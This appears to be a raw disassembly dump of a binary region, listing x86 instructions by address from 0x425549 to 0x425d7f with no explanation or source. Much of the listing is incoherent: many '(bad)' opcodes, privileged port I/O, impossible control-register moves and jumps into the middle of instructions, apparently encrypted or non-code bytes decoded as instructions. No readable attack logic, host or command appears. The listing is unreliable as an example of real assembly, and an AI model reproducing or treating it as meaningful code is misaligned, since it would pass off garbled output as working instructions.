  425549:	ror    BYTE PTR [ecx],1
  42554b:	loopne 0x4255c4
  42554d:	dec    ebp
  42554e:	or     eax,esp
  425550:	xchg   edi,eax
  425551:	or     eax,0x8d8d7acf
  425556:	lea    esi,[ebx]
  425558:	sti    
  425559:	or     eax,esp
  42555b:	xchg   edi,eax
  42555c:	int3   
  42555d:	xor    edi,ebx
  42555f:	adc    BYTE PTR [edi-0x7b],dh
  425562:	cld    
  425563:	ja     0x42556b
  425565:	or     eax,0xd48a77fc
  42556a:	cld    
  42556b:	ja     0x4255ba
  42556d:	jl     0x42556b
  42556f:	ja     0x42557e
  425571:	sar    esp,cl
  425573:	ja     0x425541
  425575:	push   esp
  425576:	(bad)  
  425577:	ja     0x425545
  425579:	(bad)  
  42557a:	xchg   edi,eax
  42557b:	or     eax,0x978ffba6
  425580:	dec    ebp
  425581:	sar    bl,cl
  425583:	(bad)  
  425584:	xchg   edi,eax
  425585:	mov    cl,BYTE PTR [ebx]
  425587:	pop    es
  425588:	(bad)  
  425589:	xchg   edi,eax
  42558a:	push   es
  42558b:	sar    bl,cl
  42558d:	(bad)  
  42558e:	xchg   edi,eax
  42558f:	test   esi,edx
  425591:	neg    ebx
  425593:	or     DWORD PTR [ecx],ecx
  425595:	loopne 0x42560e
  425597:	or     DWORD PTR [edi+0x8],eax
  42559a:	lea    ecx,[ebp+0x977108d]
  4255a0:	div    eax
  4255a2:	or     DWORD PTR [edi-0x11eff689],ecx
  4255a8:	outs   dx,BYTE PTR ds:[esi]
  4255a9:	xchg   edx,eax
  4255aa:	arpl   ax,si
  4255ac:	out    dx,eax
  4255ad:	in     al,0x50
  4255af:	dec    ebp
  4255b0:	xlat   BYTE PTR ds:[ebx]
  4255b1:	out    dx,eax
  4255b2:	cdq    
  4255b3:	xchg   BYTE PTR [edx-0x76],cl
  4255b6:	dec    ebp
  4255b7:	dec    ebp
  4255b8:	jo     0x4255b5
  4255ba:	out    dx,eax
  4255bb:	lea    edx,[edi-0x785d7880]
  4255c1:	cmp    eax,0x938d8dee
  4255c6:	cdq    
  4255c7:	mul    BYTE PTR fs:[edi+ebp*2]
  4255cb:	cmp    BYTE PTR [eax-0x59],dl
  4255ce:	xor    bh,BYTE PTR [edi+esi*2-0x76]
  4255d2:	cmc    
  4255d3:	and    al,0x6f
  4255d5:	cmp    BYTE PTR [edi+esi*2-0x79],bh
  4255d9:	imul   BYTE PTR [edi+ebp*2]
  4255dc:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  4255e0:	xchg   esi,eax
  4255e1:	mov    ch,0xcb
  4255e3:	scas   al,BYTE PTR es:[edi]
  4255e4:	xor    BYTE PTR [edi+0x32],0x80
  4255e8:	lock xor bl,BYTE PTR [ebx-0x2cfef21e]
  4255ef:	cmp    ch,BYTE PTR [ebx+0x2a53fc53]
  4255f5:	mov    dl,0x86
  4255f7:	or     al,0xb2
  4255f9:	mov    edx,0x50b2ff29
  4255fe:	ja     0x42558b
  425600:	jl     0x425679
  425602:	sbb    esp,0x24
  425605:	outs   dx,DWORD PTR ds:[esi]
  425606:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  42560a:	inc    edi
  42560b:	sbb    al,0xf9
  42560d:	adc    edi,DWORD PTR [edi+esi*2-0x7c]
  425611:	out    dx,eax
  425612:	lea    ecx,[ebp-0x7f8f7f73]
  425618:	ja     0x4255a4
  42561a:	xor    al,0x8a
  42561d:	push   ebx
  42561e:	sub    dh,BYTE PTR [edx-0x3acd646]
  425624:	mov    dl,0x86
  425626:	or     al,0xff
  425628:	mov    dl,0x80
  42562a:	lock xor al,BYTE PTR [eax+0x51533297]
  425631:	push   ebx
  425632:	pushf  
  425633:	mov    dl,0xbe
  425635:	or     al,0xb2
  425637:	clc    
  425638:	sub    edi,edi
  42563a:	dec    BYTE PTR [ecx]
  42563c:	and    dh,BYTE PTR [edx+0x778092c4]
  425642:	enter  0xf080,0xc8
  425646:	mov    dl,0x86
  425648:	sub    DWORD PTR [edx-0x4d00f346],esi
  42564e:	push   ebx
  42564f:	je     0x4256a1
  425651:	ja     0x4255de
  425653:	add    DWORD PTR [edi-0x75],esi
  425656:	or     al,BYTE PTR [esi+0x4d4dcc1a]
  42565c:	push   eax
  42565d:	ja     0x4255ea
  42565f:	xor    BYTE PTR [edi-0x75],0x80
  425663:	lock enter 0xf50,0x1
  425668:	add    BYTE PTR [esi],0x4d
  42566b:	dec    ebp
  42566c:	xor    BYTE PTR [edi-0x76],0x80
  425670:	lock mov dl,BYTE PTR [ebx-0x4]
  425674:	push   ebx
  425675:	sub    dh,BYTE PTR [edx-0x454df37a]
  42567b:	sub    edi,edi
  42567d:	mov    dl,0xec
  42567f:	ja     0x425649
  425681:	push   eax
  425682:	ja     0x42564c
  425684:	xor    BYTE PTR [edi-0x79],0x80
  425688:	lock xchg DWORD PTR [ebx+0x2a],edx
  42568c:	mov    dl,0xba
  42568e:	sub    DWORD PTR [ebx-0x4],edx
  425691:	mov    dl,0x86
  425693:	or     al,0xff
  425695:	mov    dl,0x80
  425697:	lock mov al,BYTE PTR [eax+0x51538a97]
  42569e:	push   ebx
  42569f:	pushf  
  4256a0:	mov    dl,0xbe
  4256a2:	or     al,0xb2
  4256a4:	clc    
  4256a5:	sub    edi,edi
  4256a7:	inc    BYTE PTR [ebx-0x4e]
  4256aa:	xor    al,0xc8
  4256ad:	arpl   bp,di
  4256af:	fstp   DWORD PTR [edx]
  4256b1:	xor    BYTE PTR [edi-0x7],0x80
  4256b5:	lock stc 
  4256b7:	push   ebx
  4256b8:	cld    
  4256b9:	push   ebx
  4256ba:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256c0:	sub    edi,edi
  4256c2:	mov    dl,0x50
  4256c4:	ja     0x425651
  4256c6:	jl     0x42573f
  4256c8:	xchg   DWORD PTR [edx-0x7fc790e2],ebp
  4256ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256cf:	mov    esi,0x8d8d8dcd
  4256d4:	xor    al,0x83
  4256d7:	xor    BYTE PTR [edi-0x7d],0x53
  4256db:	jl     0x42568f
  4256dd:	test   BYTE PTR [ecx],ch
  4256df:	push   ebx
  4256e0:	push   ecx
  4256e1:	mov    dl,0xbe
  4256e3:	or     al,0xff
  4256e5:	std    
  4256e6:	xor    BYTE PTR [edi-0x75],0x94
  4256ea:	xchg   BYTE PTR [eax+0x77],dl
  4256ed:	add    BYTE PTR [eax-0x72701089],0x10
  4256f4:	ja     0x4256ba
  4256f6:	(bad)  
  4256f7:	ja     0x4256bd
  4256f9:	xor    al,0x8b
  4256fc:	or     eax,esp
  4256fe:	push   0x53
  425700:	mov    dl,0x50
  425702:	ja     0x4256cc
  425704:	xor    BYTE PTR [edi-0x79],0x80
  425708:	lock xchg DWORD PTR [ebx-0x4],edx
  42570c:	mov    dl,0x86
  42570e:	or     al,0x53
  425710:	sub    dh,BYTE PTR [edx-0x4d00d646]
  425716:	xor    al,0xc8
  425719:	xor    esi,DWORD PTR [edx-0x7db0f080]
  42571f:	push   es
  425720:	dec    ebp
  425721:	dec    ebp
  425722:	xor    al,0x82
  425725:	push   ebx
  425726:	mov    dl,0x50
  425728:	ja     0x4256b5
  42572a:	xor    BYTE PTR [edi-0x76],0x80
  42572e:	lock mov dl,BYTE PTR [ebx-0x4]
  425732:	push   ebx
  425733:	sub    dh,BYTE PTR [edx-0x454df37a]
  425739:	sub    edi,edi
  42573b:	mov    dl,0x3a
  42573d:	ja     0x42572e
  42573f:	xor    BYTE PTR [edi-0x76],0x80
  425743:	lock mov dl,BYTE PTR [ebx-0x4]
  425747:	push   ebx
  425748:	sub    dh,BYTE PTR [edx-0x454df37a]
  42574e:	sub    edi,edi
  425750:	mov    dl,0x3f
  425752:	ja     0x4256d8
  425754:	xor    BYTE PTR [edi+0x32],0x80
  425758:	lock xor dl,BYTE PTR [ebx+0x2a]
  42575c:	push   ebx
  42575d:	cld    
  42575e:	mov    dl,0xba
  425760:	sub    DWORD PTR [edx-0x4d00f37a],esi
  425766:	xor    al,0x84
  425769:	arpl   bp,di
  42576b:	or     DWORD PTR [edi-0x4d],ecx
  42576e:	dec    ebp
  42576f:	dec    ebp
  425770:	dec    ebp
  425771:	xor    BYTE PTR [edi-0x7],0x80
  425775:	lock stc 
  425777:	push   ebx
  425778:	cld    
  425779:	push   ebx
  42577a:	sub    dh,BYTE PTR [edx-0x794dd646]
  425780:	or     al,0xab
  425782:	push   DWORD PTR [edx-0x56740f80]
  425788:	push   ebx
  425789:	mov    dl,0xa3
  42578b:	jo     0x425788
  42578d:	out    dx,al
  42578e:	lea    edx,[edi-0x78127880]
  425794:	jno    0x4257e9
  425796:	jo     0x42572b
  425798:	fwait
  425799:	pop    edi
  42579a:	lock out dx,eax
  42579c:	or     DWORD PTR [edi],ecx
  42579e:	pop    esp
  42579f:	lea    ecx,[ebp+0x905638d]
  4257a5:	mov    cr1,ebp
  4257a8:	lea    ecx,[ebp+0x2d995c09]
  4257ae:	pop    esi
  4257af:	and    al,0x38
  4257b1:	lea    ecx,[ebp+0x508af050]
  4257b7:	lock xor dl,BYTE PTR [ebx-0x9]
  4257bb:	push   eax
  4257bc:	lock mov edi,DWORD PTR [ecx-0x49460180]
  4257c3:	jo     0x425818
  4257c5:	dec    ebp
  4257c6:	jl     0x42583f
  4257c8:	enter  0x4d07,0x4d
  4257cc:	dec    ebp
  4257cd:	mov    ecx,0xc5d3cb63
  4257d2:	mov    ecx,0xb98ae780
  4257d7:	mov    dh,0x7c
  4257d9:	mov    ecx,0x5c098b53
  4257de:	lock mov eax,DWORD PTR [ecx]
  4257e1:	and    esp,ebx
  4257e3:	mov    ecx,0xd70cdf5f
  4257e8:	pop    ebx
  4257e9:	or     DWORD PTR [eax+esi*1+0x50],ebx
  4257ed:	lock enter 0x63b9,0xfd
  4257f2:	xlat   BYTE PTR ds:[ebx]
  4257f3:	iret   
  4257f4:	or     DWORD PTR [eax+esi*8-0x76],ebx
  4257f8:	and    BYTE PTR [edi+0x1f65cdef],0x8d
  4257ff:	aad    0x53
  425801:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425805:	and    BYTE PTR [edi-0x5f64611],0x21
  42580c:	pop    ds
  42580d:	mov    ecx,0x53b9b2b6
  425812:	std    
  425813:	mov    ecx,0xd5c8f05f
  425818:	and    edi,DWORD PTR [edi+esi*2-0x38]
  42581c:	xchg   BYTE PTR [ebp+0x4d],cl
  42581f:	dec    ebp
  425820:	dec    ebp
  425821:	ja     0x4257ae
  425823:	cmp    ch,0xb9
  425826:	push   ebx
  425827:	mov    cl,0x2d
  425829:	mov    ecx,0x5fb970b6
  42582e:	lock mov esp,esp
  425831:	cmc    
  425832:	les    esp,FWORD PTR [esi+0x7c32774d]
  425838:	ja     0x425802
  42583a:	mov    esi,0x94d4d4d
  42583f:	pop    esp
  425840:	out    0x8a,eax
  425842:	and    BYTE PTR [edi+0x5d7053ef],0x21
  425849:	sub    edx,ebp
  42584b:	pop    ss
  42584c:	dec    ebp
  42584d:	ja     0x4257d9
  42584f:	in     eax,dx
  425850:	out    0xc8,eax
  425852:	xchg   BYTE PTR [ecx],cl
  425854:	dec    edi
  425855:	ror    BYTE PTR [ebp+0x4d],1
  425858:	dec    ebp
  425859:	push   ebx
  42585a:	push   0xffffffab
  42585c:	mov    ds:0x8deefb70,eax
  425861:	xor    al,0x32
  425864:	mov    ecx,0x53b9b2b6
  425869:	std    
  42586a:	push   ebx
  42586b:	push   0xffffffb9
  42586d:	arpl   WORD PTR [ecx+0x6a16092d],si
  425873:	les    eax,FWORD PTR [edx]
  425875:	xchg   edi,eax
  425876:	add    BYTE PTR [edi-0x6c427813],0x99
  42587d:	fwait
  42587e:	loop   0x4258c5
  425880:	dec    ebp
  425881:	xlat   BYTE PTR ds:[ebx]
  425882:	out    dx,eax
  425883:	xor    BYTE PTR [edx],0x86
  425886:	inc    ebx
  425887:	mov    ecx,DWORD PTR [ebp+0x4d]
  42588a:	add    DWORD PTR [ecx-0x40],edi
  42588d:	push   eax
  42588e:	ja     0x4258b6
  425890:	add    DWORD PTR [ecx+0x75],edi
  425893:	push   eax
  425894:	ja     0x4258c4
  425896:	add    DWORD PTR [ecx-0x47],edi
  425899:	push   eax
  42589a:	ja     0x4258d2
  42589c:	add    DWORD PTR [eax+edx*1-0x73],ecx
  4258a0:	lea    ecx,[ebp+0x13e7750]
  4258a6:	dec    esp
  4258a7:	cmc    
  4258a8:	lea    ecx,[ebp+0x4677508d]
  4258ae:	add    DWORD PTR [edi+ebp*4-0x73],ecx
  4258b2:	lea    ecx,[ebp+0x1627750]
  4258b8:	dec    esp
  4258b9:	mov    BYTE PTR [ebp+0x77508d8d],cl
  4258bf:	push   esi
  4258c0:	add    DWORD PTR [ecx+esi*2+0x3a],ecx
  4258c4:	lea    ecx,[ebp+0x15e7750]
  4258ca:	dec    esp
  4258cb:	aam    0x3a
  4258cd:	lea    ecx,[ebp+0x50667750]
  4258d3:	xlat   BYTE PTR ds:[ebx]
  4258d4:	push   ds
  4258d5:	add    DWORD PTR [ebp+edx*4+0x3a],ecx
  4258d9:	lea    ecx,[ebp-0x7f9588b0]
  4258df:	dec    esp
  4258e0:	cmp    cl,BYTE PTR ds:[ebp+0x5381808d]
  4258e7:	jb     0x425939
  4258e9:	xchg   edi,eax
  4258ea:	not    DWORD PTR [eax-0x69]
  4258ed:	jp     0x42593f
  4258ef:	xchg   edi,eax
  4258f0:	adc    BYTE PTR [eax-0x69],0x83
  4258f4:	jl     0x42596d
  4258f6:	std    
  4258f7:	(bad)  [esi-0x79a1ee21]
  4258fd:	pop    DWORD PTR [ebx+0x26]
  425900:	push   eax
  425901:	ja     0x4258b2
  425903:	xor    al,0xfd
  425906:	and    bh,0xaf
  425909:	push   ebx
  42590a:	mov    esp,DWORD PTR [edx-0x20a724fb]
  425910:	adc    DWORD PTR [ecx],ecx
  425912:	inc    esi
  425913:	retf   
  425914:	or     al,0xb2
  425916:	popa   
  425917:	or     al,0x50
  425919:	out    0xf9,eax
  42591b:	and    bh,0xfd
  42591e:	and    BYTE PTR [edi+0x53ac80af],0x4d
  425925:	push   ebx
  425926:	test   DWORD PTR [edx+0x2aff29b4],esi
  42592c:	and    bh,0xf9
  42592f:	icebp  
  425930:	lea    ecx,[ebp+0x353cd8d]
  425936:	inc    DWORD PTR [esi]
  425938:	jmp    FWORD PTR [edx]
  42593a:	push   eax
  42593b:	xlat   BYTE PTR ds:[ebx]
  42593c:	mov    ecx,DWORD PTR [ecx]
  42593e:	(bad)  
  425940:	lea    ecx,[ebp-0x8885d73]
  425946:	rcr    ebp,0x86
  425949:	outs   dx,DWORD PTR ds:[esi]
  42594a:	pusha  
  42594b:	mov    esi,0xe26438f
  425950:	lock jp 0x4258f5
  425953:	ja     0x4258d7
  425955:	rcr    ebp,0x52
  425958:	or     al,0xe
  42595a:	lock add DWORD PTR [eax-0x287f0210],0xffffffaf
  425962:	and    bh,0xfd
  425965:	and    BYTE PTR [edi-0x5dcdac51],0x5
  42596c:	fistp  DWORD PTR [eax-0x21]
  42596f:	adc    DWORD PTR [ecx],ecx
  425971:	inc    esi
  425972:	add    eax,0x29bcb20c
  425977:	mov    dl,0x88
  425979:	or     al,0x53
  42597b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42597c:	push   ebx
  42597d:	test   edi,edi
  42597f:	adc    edi,edi
  425981:	dec    ebx
  425982:	in     eax,dx
  425983:	mov    dl,0x4d
  425985:	in     eax,dx
  425986:	jle    0x4259d5
  425988:	push   eax
  425989:	lock std 
  42598b:	push   eax
  42598c:	xlat   BYTE PTR ds:[ebx]
  42598d:	scas   eax,DWORD PTR es:[edi]
  42598e:	xor    al,0xf7
  425991:	push   eax
  425993:	jp     0x42596a
  425995:	and    esp,DWORD PTR [edx+0x36ff777]
  42599b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42599c:	retf   
  42599d:	pusha  
  42599e:	sbb    edi,edx
  4259a0:	jp     0x425955
  4259a2:	push   cs
  4259a3:	lock jp 0x425948
  4259a6:	ja     0x42592a
  4259a8:	sti    
  4259a9:	jl     0x425987
  4259ab:	int3   
  4259ac:	push   cs
  4259ad:	lock add esp,0x1d
  4259b1:	mov    ds:0xddc1f7f0,al
  4259b6:	xchg   BYTE PTR [ecx+0x30],bh
  4259b9:	ja     0x425a35
  4259bb:	mov    ds:0xddc182b7,al
  4259c0:	push   edx
  4259c1:	jmp    0x438f:0xbe83b7a2
  4259c8:	es xor al,0xfd
  4259cc:	xor    al,0xaf
  4259cf:	and    bh,0xfd
  4259d2:	and    BYTE PTR [edi+0x63609af],0xc
  4259d9:	mov    dl,0xbe
  4259db:	sub    DWORD PTR [ebx+0xb],edx
  4259de:	inc    esi
  4259e0:	mov    dl,0xbc
  4259e2:	or     al,0xff
  4259e4:	sub    ah,BYTE PTR [edx-0x20a726fb]
  4259ea:	adc    DWORD PTR [eax-0x10],edx
  4259ed:	std    
  4259ee:	push   ebx
  4259ef:	xor    dl,BYTE PTR [eax-0x29]
  4259f2:	scas   eax,DWORD PTR es:[edi]
  4259f3:	xor    al,0xfd
  4259f6:	adc    bh,0xaf
  4259f9:	and    bh,0xfd
  4259fc:	and    BYTE PTR [edi-0x5dcdac51],0x5
  425a03:	fistp  DWORD PTR [eax-0x21]
  425a06:	adc    DWORD PTR [ecx],ecx
  425a08:	inc    esi
  425a09:	add    eax,0x29bcb20c
  425a0e:	mov    dl,0x88
  425a10:	or     al,0x53
  425a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a13:	push   ebx
  425a14:	test   edi,edi
  425a16:	adc    edi,edi
  425a18:	dec    ebx
  425a19:	call   DWORD PTR [ecx+0x9]
  425a1c:	dec    edi
  425a1d:	ror    BYTE PTR [ebp+0x4d],0x4d
  425a21:	adc    bh,0x8b
  425a24:	dec    edi
  425a25:	or     ecx,DWORD PTR [ecx]
  425a27:	mov    cr1,ebp
  425a2a:	lea    ecx,[ebp-0x7f9a8680]
  425a30:	in     eax,0x81
  425a32:	fucomp st(4)
  425a34:	or     eax,0x80359b80
  425a39:	leave  
  425a3a:	and    eax,0x802d7b80
  425a3f:	stos   DWORD PTR es:[edi],eax
  425a40:	sbb    eax,0x97507eec
  425a45:	scas   eax,DWORD PTR es:[edi]
  425a46:	sbb    BYTE PTR [ebx-0x13ae13eb],0xfc
  425a4d:	push   eax
  425a4e:	lock xchg DWORD PTR [eax+0x77],edx
  425a52:	jp     0x425aa4
  425a54:	xchg   edi,eax
  425a55:	enter  0x9463,0xdb
  425a59:	in     al,dx
  425a5a:	push   eax
  425a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a5c:	enter  0x7253,0x50
  425a60:	xchg   edi,eax
  425a61:	sbb    DWORD PTR [edi-0x69],0xffffffc8
  425a65:	(bad)  
  425a67:	(bad)  
  425a68:	in     al,dx
  425a69:	xor    BYTE PTR [edi+0x7a],0x80
  425a6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a6e:	scas   eax,DWORD PTR es:[edi]
  425a6f:	or     DWORD PTR [ebp+eiz*1-0x6d],ebx
  425a73:	arpl   WORD PTR [ebx+0x63b3d31d],bx
  425a79:	stos   DWORD PTR es:[edi],eax
  425a7a:	adc    eax,0xee80a9d3
  425a7f:	pop    edx
  425a80:	adc    BYTE PTR [edi+0x202580ef],0x50
  425a87:	xchg   edi,eax
  425a88:	mov    ch,ah
  425a8a:	cld    
  425a8b:	add    DWORD PTR [edi+0x4304ec1e],edx
  425a91:	xchg   edi,eax
  425a92:	out    dx,eax
  425a93:	push   eax
  425a94:	ja     0x425ac8
  425a96:	push   eax
  425a97:	xchg   edi,eax
  425a98:	jbe    0x425b16
  425a9a:	ja     0x425a95
  425a9c:	dec    DWORD PTR [ebp-0x687f7273]
  425aa2:	mov    ch,ch
  425aa4:	(bad)  
  425aa5:	(bad)  
  425aa6:	xlat   BYTE PTR ds:[ebx]
  425aa7:	sub    DWORD PTR [edx],ecx
  425aa9:	xor    BYTE PTR [edi+0x76],0x80
  425aad:	push   ebp
  425aae:	jno    0x425a36
  425ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ab1:	mov    cl,BYTE PTR [ebp+0x4d]
  425ab4:	adc    bh,0x8b
  425ab7:	xor    al,0x87
  425aba:	dec    edi
  425abb:	push   0xffffffd5
  425abd:	das    
  425abe:	xor    BYTE PTR [edi-0x76],0x50
  425ac2:	sbb    eax,0xed327780
  425ac7:	ja     0x425a53
  425ac9:	out    dx,al
  425aca:	dec    ebp
  425acb:	lock stc 
  425acd:	xlat   BYTE PTR ds:[ebx]
  425ace:	mov    dh,0x80
  425ad0:	xchg   edi,eax
  425ad1:	sbb    eax,0x50
  425ad4:	xchg   edi,eax
  425ad5:	and    DWORD PTR [ebx-0x69],0xffffffc8
  425ad9:	in     al,0xdc
  425adb:	stos   DWORD PTR es:[edi],eax
  425adc:	cmp    ah,0xa9
  425adf:	mov    ds:0x8deefb70,eax
  425ae4:	xchg   edi,eax
  425ae5:	add    BYTE PTR [edi-0x10287f67],0x4d
  425aec:	loopne 0x425b20
  425aee:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  425af4:	xchg   ch,ah
  425af6:	int3   
  425af7:	dec    ebp
  425af8:	dec    ebp
  425af9:	or     BYTE PTR [esi+edi*1+0x3a],0x8d
  425afe:	lea    edx,[ebx+0x70]
  425b01:	pop    edi
  425b02:	out    dx,eax
  425b03:	test   eax,0x80b21809
  425b08:	mov    dl,0xa7
  425b0a:	sti    
  425b0b:	out    dx,al
  425b0c:	lea    eax,[eax-0x72c5e1e4]
  425b12:	lea    edx,[ebx+0x5e328099]
  425b18:	and    al,0x38
  425b1a:	lea    ecx,[ebp-0x2ac5e3c]
  425b20:	mov    ecx,0x50b970b6
  425b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b26:	in     eax,dx
  425b27:	sti    
  425b28:	or     al,0xed
  425b2a:	cld    
  425b2b:	or     al,0x9
  425b2d:	pop    esp
  425b2e:	mov    eax,ds:0xd7fd63b9
  425b33:	pop    es
  425b34:	push   ebx
  425b35:	push   0xffffffa9
  425b37:	mov    ecx,0xce800c50
  425b3c:	push   ds
  425b3d:	cmp    cl,BYTE PTR [ebp-0x648b5c73]
  425b43:	or     BYTE PTR [ebx+0x3a1e4c80],0x8d
  425b4a:	lea    esi,[edx+0x7cec6fbc]
  425b50:	les    esp,FWORD PTR [esi-0x3232fa33]
  425b56:	mov    esi,0x6def10bd
  425b5b:	fmul   DWORD PTR [edi-0x7934325a]
  425b61:	xlat   BYTE PTR ds:[ebx]
  425b62:	popa   
  425b63:	cld    
  425b64:	lea    ecx,[ebp+0x3a1e4c80]
  425b6a:	lea    ecx,[ebp+0x74ab7cec]
  425b70:	xchg   edi,eax
  425b71:	add    BYTE PTR [edi-0x72a5785e],0x8d
  425b78:	lea    edx,[ebx+0x438f8660]
  425b7e:	es cdq 
  425b80:	fwait
  425b81:	jl     0x425bfa
  425b83:	enter  0x58e4,0xdf
  425b87:	adc    DWORD PTR [eax-0x10],edx
  425b8a:	mov    edi,DWORD PTR [edi+esi*2-0x79]
  425b8e:	fstp   DWORD PTR [eax-0x21]
  425b91:	adc    DWORD PTR [eax-0x10],edx
  425b94:	xor    dl,BYTE PTR [ebx+0x6a]
  425b97:	jl     0x425c10
  425b99:	xchg   dh,dh
  425b9b:	and    al,0x6f
  425b9d:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  425ba1:	cmc    
  425ba2:	and    al,0x6f
  425ba4:	cmp    BYTE PTR [edi+esi*2-0x9],bh
  425ba8:	call   0x50543b05
  425bad:	lock jp 0x425c2c
  425bb0:	ja     0x425c10
  425bb2:	out    0x58,al
  425bb4:	fist   WORD PTR [ecx]
  425bb6:	push   eax
  425bb7:	lock data16 xor BYTE PTR [edi-0x79],0x80
  425bbd:	xchg   edi,eax
  425bbe:	xor    cl,BYTE PTR [ecx]
  425bc0:	inc    esi
  425bc1:	test   DWORD PTR [edx+esi*4],0x97800c07
  425bc8:	xchg   DWORD PTR [eax-0x74dcd29],eax
  425bce:	sub    DWORD PTR [edi+eiz*4-0x39],ebp
  425bd2:	add    al,0xd4
  425bd4:	push   ebx
  425bd5:	jl     0x425c2a
  425bd7:	or     edi,edi
  425bd9:	cld    
  425bda:	push   eax
  425bdb:	ja     0x425b60
  425bdd:	add    DWORD PTR [edi-0x7c],esi
  425be0:	push   eax
  425be1:	ja     0x425b92
  425be3:	xor    BYTE PTR [edi-0x51],0xfa
  425be7:	and    ah,BYTE PTR [edi+ebp*2]
  425bea:	cmp    BYTE PTR [ebp+ecx*4-0x47],bh
  425bee:	pop    eax
  425bef:	fist   WORD PTR [ecx]
  425bf1:	push   eax
  425bf2:	jge    0x425be2
  425bf4:	xor    al,0x8a
  425bf7:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  425bfe:	or     al,0xe2
  425c00:	or     eax,0xb2f7539d
  425c05:	clc    
  425c06:	sub    edi,edi
  425c08:	inc    BYTE PTR [eax-0x587f7569]
  425c0e:	mov    dl,BYTE PTR [ebx+0x7e]
  425c11:	mov    dl,0x7
  425c13:	or     al,0x53
  425c15:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c1c:	inc    BYTE PTR [eax-0x587f7569]
  425c22:	mov    dl,BYTE PTR [ebx+0x7e]
  425c25:	mov    dl,0x7
  425c27:	or     al,0x53
  425c29:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c30:	inc    BYTE PTR [eax-0x587f7569]
  425c36:	mov    dl,BYTE PTR [ebx+0x7e]
  425c39:	mov    dl,0x7
  425c3b:	or     al,0x53
  425c3d:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c44:	(bad)  
  425c45:	push   eax
  425c46:	add    DWORD PTR [edx+0x4d],edx
  425c49:	dec    ebp
  425c4a:	dec    ebp
  425c4b:	xor    al,0x86
  425c4e:	adc    BYTE PTR [edi+0x53f75386],0x51
  425c55:	mov    dl,0xf8
  425c57:	sub    DWORD PTR [edx-0x100f342],esi
  425c5d:	adc    BYTE PTR [edi-0x79587f7a],0x53
  425c64:	jle    0x425cb9
  425c66:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  425c6d:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c74:	dec    ebp
  425c75:	dec    ebp
  425c76:	xor    al,0x21
  425c79:	xor    BYTE PTR [eax],0x80
  425c7c:	xchg   edi,eax
  425c7d:	mov    al,BYTE PTR [eax+0x7f808aa7]
  425c83:	or     dl,BYTE PTR [ebx-0x7e]
  425c86:	push   ebx
  425c87:	jle    0x425c3b
  425c89:	pop    es
  425c8a:	or     al,0xb2
  425c8c:	mov    ah,0x29
  425c8e:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c95:	dec    ebp
  425c96:	dec    ebp
  425c97:	xor    al,0x71
  425c9a:	adc    BYTE PTR [edi+0x53f75371],0x51
  425ca1:	mov    dl,0xf8
  425ca3:	sub    DWORD PTR [edx-0x100f342],esi
  425ca9:	adc    BYTE PTR [edi-0x75587f76],0x53
  425cb0:	add    BYTE PTR [eax+0x7e538a77],0xb2
  425cb7:	pop    es
  425cb8:	or     al,0xb2
  425cba:	mov    ah,0x29
  425cbc:	call   DWORD PTR [eax+eax*4-0x3ac7559]
  425cc3:	mov    dl,0x86
  425cc5:	or     al,0xed
  425cc7:	(bad)  
  425cc8:	or     eax,0xff29b4b2
  425ccd:	je     0x425cbb
  425ccf:	test   DWORD PTR [eax+0x41501577],0x4d4dd518
  425cd9:	dec    ebp
  425cda:	xor    al,0x15
  425cdd:	in     eax,dx
  425cde:	add    eax,0x29bab20d
  425ce3:	push   ebx
  425ce4:	cld    
  425ce5:	mov    dl,0x86
  425ce7:	or     al,0xff
  425ce9:	mov    dl,0x80
  425ceb:	lock mov al,BYTE PTR [eax-0x3d127569]
  425cf2:	or     eax,0xf8b25153
  425cf7:	sub    DWORD PTR [edx-0x100f342],esi
  425cfd:	adc    BYTE PTR [edi-0x75587f76],0x53
  425d04:	jle    0x425cf3
  425d06:	(bad)  
  425d07:	or     eax,0xb20c07b2
  425d0c:	mov    ah,0x29
  425d0e:	call   DWORD PTR [esp+ebp*8-0x75687f02]
  425d15:	and    BYTE PTR [edi-0x1281ac76],0xc6
  425d1c:	or     eax,0xb229b4b2
  425d21:	pop    es
  425d22:	or     al,0xff
  425d24:	xchg   esp,eax
  425d25:	in     al,dx
  425d26:	(bad)  
  425d27:	push   eax
  425d28:	xend   
  425d2b:	dec    ebp
  425d2c:	dec    ebp
  425d2d:	dec    ebp
  425d2e:	add    DWORD PTR [edi+0x52],ecx
  425d31:	dec    ebp
  425d32:	dec    ebp
  425d33:	dec    ebp
  425d34:	or     al,BYTE PTR [eax-0xf7f7589]
  425d3a:	mov    ah,dl
  425d3c:	or     eax,0x53fc53a3
  425d41:	adc    DWORD PTR [edx-0x454df37a],esi
  425d47:	sub    edi,edi
  425d49:	mov    dl,0xa
  425d4b:	xor    BYTE PTR [edi+0x2d],0x1
  425d4f:	adc    ch,dh
  425d51:	lea    ecx,[ebp-0x327f6973]
  425d57:	cmp    cl,BYTE PTR ds:[ebp+0x4d814d8d]
  425d5e:	xchg   edi,eax
  425d5f:	and    eax,0x5055f080
  425d64:	cmp    al,BYTE PTR [eax-0xf7f7b89]
  425d6a:	stc    
  425d6b:	or     DWORD PTR [esi-0x3],eax
  425d6e:	or     al,0xb2
  425d70:	mov    esi,0x84f0800c
  425d75:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425d7c:	push   edi
  425d7e:	stos   BYTE PTR es:[edi],al
  425d7f:	dec    ebp
